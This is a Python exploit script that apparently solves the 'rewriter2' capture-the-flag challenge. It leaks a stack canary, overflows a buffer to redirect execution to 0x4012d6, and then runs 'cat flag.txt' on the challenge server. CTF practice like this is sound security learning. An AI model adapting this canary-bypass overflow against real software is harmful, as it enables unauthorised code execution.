
import socket
import time

# サーバーに接続
ip='rewriter2.beginners.seccon.games'
port=9001
sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect((ip, port))

time.sleep(0.5)
recieve = sc.recv(1024)
print(recieve.decode("utf-8"))



inp2=b""
for i in recieve.split(b"\n")[3:8]:
    s=i.split(b" ")[3][2:]
    # リトルエンディアンに変換してinp2に追加
    ss=s[14:16]+s[12:14]+s[10:12]+s[8:10]+s[6:8]+s[4:6]+s[2:4]+s[0:2]
    print(ss.decode())
    inp2+=bytes.fromhex(ss.decode())


# aで埋める
inp=b"\x41"*41

#print(inp.decode("utf-8"))
sc.sendall(inp)
time.sleep(1)
recieve = sc.recv(1024)


canary = b"\x00"+recieve.split(b"\n")[0][-7:]

inp2+=canary+b"\x00\x00\x00\x00\x00\x00\x00\x00"+b"\xd6\x12\x40\x00\x00\x00\x00\x00"
sc.sendall(inp2)
print(inp2)
time.sleep(1)
print(sc.recv(1024).decode("utf-8"))
time.sleep(1)

sc.sendall(b"cat flag.txt\n")
time.sleep(1)
print(sc.recv(1024))